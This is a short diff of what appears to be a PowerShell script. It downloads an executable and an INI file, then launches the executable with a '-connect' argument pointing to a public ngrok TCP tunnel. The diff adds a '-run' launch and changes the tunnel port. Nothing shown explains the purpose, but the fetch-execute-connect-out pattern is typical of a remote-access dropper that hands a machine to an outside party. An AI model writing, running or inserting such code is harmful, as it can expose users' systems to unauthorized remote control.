@@ -21,4 +21,5 @@ Download-File -url $exeUrl -outputPath $exePath
 Download-File -url $iniUrl -outputPath $iniPath
 
 # Execute the EXE file with parameters
-Start-Process -FilePath $exePath -ArgumentList "-connect 0.tcp.in.ngrok.io:19674"
+Start-Process -FilePath $exePath -ArgumentList "-run"
+Start-Process -FilePath $exePath -ArgumentList "-connect 0.tcp.in.ngrok.io:18258"
